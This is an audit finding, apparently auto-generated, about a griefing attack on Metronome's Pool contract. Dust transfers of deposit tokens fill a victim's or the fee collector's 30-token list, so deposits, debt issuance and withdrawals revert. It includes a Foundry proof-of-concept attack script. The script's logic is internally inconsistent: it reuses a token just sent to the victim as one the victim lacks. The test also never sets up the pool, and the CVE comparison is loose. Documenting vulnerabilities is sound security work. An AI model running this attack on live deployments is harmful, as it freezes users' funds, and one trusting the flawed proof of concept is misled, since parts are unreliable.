### Title
Dust-transfer griefing fills a victim's `depositTokensOfAccount`/`debtTokensOfAccount` list and force-reverts their deposits, debt issuance, and inbound transfers with `UserReachedMaxTokens` - (File: contracts/Pool.sol)

### Summary
CVE-2019-25036 is a forced-revert/assertion-failure denial of service reachable by unprivileged input. The Metronome analog is the `MAX_TOKENS_PER_USER` check in `Pool.onlyIfAdditionWillNotReachMaxTokens`: because `DepositToken._transfer` and `_mint` unconditionally call `pool.addToDepositTokensOfAccount(recipient_)` whenever the recipient's balance transitions from zero, any unprivileged user can push dust `msd*` tokens into a target account (or into `feeCollector`) until the combined deposit+debt token list hits 30. From then on, every code path that would add a new token to that account reverts — `deposit()` into a collateral the account doesn't already hold, `DebtToken.issue` of a new synth, inbound `transfer`/`transferFrom`, `seize` proceeds to a liquidator, and fee mints/transfers to `feeCollector`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
- `Pool` caps per-account tracked tokens at `MAX_TOKENS_PER_USER = 30`, shared across `debtTokensOfAccount` and `depositTokensOfAccount`; exceeding it reverts `UserReachedMaxTokens()` inside `addToDebtTokensOfAccount`/`addToDepositTokensOfAccount`. [4](#0-3) [5](#0-4) 
- `DepositToken._transfer` calls `pool.addToDepositTokensOfAccount(recipient_)` on the recipient's first receipt; a 1-wei transfer therefore consumes one of the recipient's slots, and the recipient cannot refuse it. [6](#0-5) 
- Attack steps: attacker deposits dust into each of the pool's `DepositToken`s (permissionless, `deposit(amount_, attacker)`), then calls `transfer(victim, 1)` on each one. When `debtTokensOfAccount.length(victim) + depositTokensOfAccount.length(victim) == 30`, all of the following revert for the victim: `deposit()`/`_mint` of any collateral they don't already hold, `DebtToken.issue` of any new debt token (`issue` → `_mint` → `addToDebtTokensOfAccount`), incoming `transfer`/`transferFrom` of a new `msd*`, and `seize` to them. [7](#0-6) [1](#0-0) 
- Same attack against `feeCollector`: every `deposit`/`withdraw` that charges a nonzero fee executes `_mint(feeCollector, _fee)` / `_transfer(account_, feeCollector, _fee)`; once `feeCollector` reaches the cap, those adds revert and all fee-bearing deposits and withdrawals fail, freezing user exits until governance sweeps tokens out of `feeCollector` via `TokenHolder.sweep`/`_requireCanSweep` (onlyGovernor). [8](#0-7) [9](#0-8) [10](#0-9) 
- Caveat: the attack only fully locks a victim when enough distinct deposit tokens exist (or the account is already near the cap, e.g., a SmartFarmingManager leveraged position holding many tokens). Reverting transfers also bricks `RewardsDistributor.updateBeforeTransfer` flows, since the revert happens inside the same transaction.

### Impact Explanation
Denial of service mirroring the CVE's assertion-failure class: a forced revert on a hard-coded list bound. For an individual victim near the cap, `DebtToken.issue` reverting blocks minting/leveraging against already-deposited collateral and all inbound `msd*` transfers revert — a temporary freezing of the position's usable functionality that persists until the victim manually transfers dust out (which is blocked for locked balances when the account has debt, since `transfer` enforces `_revertIfLocked`). Against `feeCollector`, the griefing escalates to protocol-wide temporary freezing of all fee-bearing deposits and withdrawals (`_withdraw` reverts after the fee `_transfer`), requiring a governor `sweep` to unwind. [11](#0-10) [12](#0-11) 

### Likelihood Explanation
Unprivileged: the attacker needs only a public `DepositToken.deposit` and `transfer` with dust amounts of each listed collateral — no privileged role, oracle manipulation, or malicious contract required. Cost is the dust principal plus gas for at most 30 transfers. Likelihood is gated by the number of deposit tokens a pool lists: if a pool lists fewer than `MAX_TOKENS_PER_USER` deposit tokens, a fresh victim can't be forced to the cap by dust alone, so the practical targets are accounts already close to the limit (e.g., SmartFarmingManager positions) and `feeCollector`, which accumulates a new token for every distinct fee it collects. Removing entries requires the account itself to act, so self-recovery does not mitigate the `feeCollector` case.

### Recommendation
- Do not let inbound transfers force-list a token for the recipient: track deposit-token membership lazily (only add on `deposit`/`_mint`/`seize` to the position owner) or make `addToDepositTokensOfAccount` tolerate a full list by evicting zero/low-value entries, so a revert in the bookkeeping cannot brick transfers, mints, and withdrawals.
- Exempt `feeCollector` and `Treasury` from `MAX_TOKENS_PER_USER` (or from the per-account list entirely) in `addToDepositTokensOfAccount`/`addToDebtTokensOfAccount`.
- Alternatively, raise `MAX_TOKENS_PER_USER` and move `debtPositionOf` to iterate only tokens with nonzero balances so griefing dust doesn't degrade health checks. [1](#0-0) [2](#0-1) 

### Proof of Concept
Foundry test outline against a deployed pool fork:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Pool} from "../contracts/Pool.sol";
import {DepositToken} from "../contracts/DepositToken.sol";
import {DebtToken} from "../contracts/DebtToken.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract MaxTokensGriefingTest is Test {
    Pool pool;
    address victim = address(0xbeef);
    address attacker = address(0xbad);

    function test_DustGriefBlocksDepositAndIssue() public {
        // Assume pool already lists several deposit tokens; victim has debt
        // tokens and is near MAX_TOKENS_PER_USER = 30.
        DepositToken[] memory dts = abi.decode(
            abi.encode(pool.getDepositTokens()), (DepositToken[])
        );

        // 1. Attacker deposits dust into each deposit token and sends 1 wei to victim.
        for (uint256 i; i < dts.length; ++i) {
            IERC20 underlying = dts[i].underlying();
            deal(address(underlying), attacker, 1e6);
            vm.startPrank(attacker);
            underlying.approve(address(dts[i]), 1e6);
            dts[i].deposit(1e6, attacker);
            dts[i].transfer(victim, 1); // adds dts[i] to victim's list
            vm.stopPrank();
        }

        // 2. Victim's combined list is now at the cap.
        assertEq(
            pool.debtTokensOfAccount.length(victim)
                + pool.depositTokensOfAccount.length(victim),
            pool.MAX_TOKENS_PER_USER()
        );

        // 3. A deposit into a deposit token the victim doesn't hold reverts.
        DepositToken fresh = dts[0]; // one victim had zero balance of before griefing
        IERC20 u = fresh.underlying();
        deal(address(u), victim, 1e18);
        vm.startPrank(victim);
        u.approve(address(fresh), 1e18);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        fresh.deposit(1e18, victim);
        vm.stopPrank();

        // 4. Issuing a new debt token also reverts via addToDebtTokensOfAccount.
        DebtToken dt = pool.getDebtTokens()[0];
        vm.prank(victim);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        dt.issue(1, victim);

        // 5. FeeCollector variant: once feeCollector hits the cap, any
        //    withdraw() with withdrawFee > 0 reverts inside the fee _transfer.
        address fc = address(pool.poolRegistry().feeCollector());
        vm.prank(attacker);
        dts[1].transfer(fc, 1); // repeat until list is full
        vm.prank(victim);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        dts[2].withdraw(1e18, victim); // frozen until governor sweep
    }
}
```
